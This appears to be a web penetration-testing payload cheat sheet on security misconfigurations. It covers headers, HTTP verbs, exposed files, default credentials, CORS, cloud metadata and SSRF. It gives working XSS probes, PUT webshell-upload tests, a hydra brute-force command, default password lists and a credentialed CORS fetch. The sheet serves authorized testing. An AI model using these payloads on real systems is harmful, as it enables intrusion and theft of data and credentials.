# Payloads: Security Misconfiguration

This document provides curated, annotated payloads to test common security misconfigurations. Use responsibly in authorized environments only.

Legend:
- [!] High risk/impact
- [D] Detection-oriented
- [E] Exploitation-oriented

## 1) Security Headers

- [D] Request baseline and inspect headers
  - Method: GET /
  - Observation: Check for Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy

- [E] CSP bypass probes (if CSP weak/missing)
  - Inject: <img src=x onerror=alert(1)>
  - Inline script test: <script>alert(1)</script>
  - JSON-in-script test: </script><script>alert(1)</script>

- [D] HSTS validation
  - Enforce https, preload candidates

## 2) HTTP Methods and Verb Tunneling

- [D] OPTIONS discovery
  - curl -i -X OPTIONS https://target.tld/
  - Observation: Allow header for PUT, DELETE, TRACE

- [E] PUT upload test [!]
  - curl -i -X PUT --data 'owned' https://target.tld/test.txt
  - If success: attempt webroot upload: test.aspx, test.php

- [E] WebDAV probe
  - curl -i -X PROPFIND https://target.tld/

- [D] Verb tunneling
  - X-HTTP-Method-Override: DELETE
  - X-HTTP-Method: DELETE

## 3) Directory Listing / Sensitive Files

- [D] Common paths
  - /.git/, /.svn/, /.DS_Store, /backup/, /old/, /test/, /admin/, /debug/, /config/, /.env

- [E] Git disclosure
  - Download .git and reconstruct: git-dumper https://target.tld/.git out

- [D] Robots.txt and sitemap.xml enumeration

## 4) Default Credentials & Admin Panels

- [D] Fingerprint common panels
  - /phpmyadmin, /wp-admin, /manager/html (Tomcat), /jenkins, /grafana, /kibana, /prometheus

- [E] Default creds wordlist
  - admin:admin, admin:password, root:toor, tomcat:tomcat, jenkins:admin/admin

- [D] HTTP basic auth brute (limited)
  - hydra -L users.txt -P passwords.txt http-get://target.tld/secret

## 5) CORS Misconfiguration

- [D] Origin reflection
  - Send Origin: https://evil.tld and check Access-Control-Allow-Origin

- [E] Credentialed CORS abuse [!]
  - If Access-Control-Allow-Credentials: true and wildcard/broad origin:
    fetch('https://target.tld/api/secret',{credentials:'include'})

- [D] Null origin test
  - Origin: null (sandboxed iframes)

## 6) Verbose Errors / Stack Traces

- [D] Trigger errors
  - Add unexpected parameter types, overlong inputs, missing required fields

- [D] Content negotiation
  - Accept: application/json, text/xml to see different error bodies

- [D] Debug endpoints
  - /debug, /actuator, /actuator/env, /actuator/heapdump, /_profiler, /console, /graphql

## 7) Cloud Storage & Metadata

- [D] S3 bucket checks
  - http(s)://bucket.s3.amazonaws.com/?list-type=2
  - aws s3 ls s3://bucket --no-sign-request

- [D] GCP/Azure equivalents
  - https://storage.googleapis.com/bucket
  - https://account.blob.core.windows.net/container?restype=container&comp=list

- [E] IMDS/metadata exposure [!]
  - http://169.254.169.254/latest/meta-data/
  - For GCP: http://metadata.google.internal/computeMetadata/v1/ (with header Metadata-Flavor: Google)

## 8) TLS/HTTPS

- [D] Weak ciphers, TLS1.0/1.1
  - testssl.sh https://target.tld

- [D] Mixed content
  - Load over https and inspect http resources

## 9) File/Dir Permissions

- [D] World-readable configs
  - /WEB-INF/web.xml, /application.properties, /config.yaml, .env, .bak/.old files

- [E] Backup tilde/zip leakage
  - /index.php~, /config.php.save, /site.zip, /backup.tar.gz

## 10) Framework/Platform Defaults

- [D] Spring Boot Actuators, Django debug, Laravel debugbar
- [D] Default error pages disclosing versions (Apache, Nginx, IIS, Express)

## 11) Cache and Proxy

- [D] Cache poisoning headers
  - X-Forwarded-Host, X-Original-URL, X-HTTP-Method-Override

- [E] CDN misconfig
  - Origin exposure, stale cache of authenticated responses

## 12) SSRF via misconfig

- [E] Open proxies / misrouted internal hosts
  - http://localhost:8080/admin, http://127.0.0.1, http://intranet

## Example Burp Repeater Templates

- OPTIONS Probe
  OPTIONS / HTTP/1.1
  Host: target.tld
  Origin: https://evil.tld
  User-Agent: Mozilla/5.0
  Accept: */*
  Connection: close

- PUT Upload Probe
  PUT /test.txt HTTP/1.1
  Host: target.tld
  Content-Length: 6

  owned

- CORS Credentialed Request (browser console)
  fetch('https://target.tld/api/secret',{credentials:'include'}).then(r=>r.text()).then(console.log)

## Wordlists and Tools

- Dir enum: wordlists/raft-medium-files.txt, SecLists/Discovery/Web-Content/
- Default creds: SecLists/Passwords/Default-Credentials/
- Headers: securityheaders.com, Mozilla Observatory
- TLS: ssllabs.com, testssl.sh
- Cloud: S3Scanner, CloudSploit, ScoutSuite

## Safe Testing Notes

- Prefer non-destructive methods first
- Avoid uploading executable files unless explicitly allowed
- Respect rate limits; add delays
- Capture evidence: screenshots, raw requests/responses
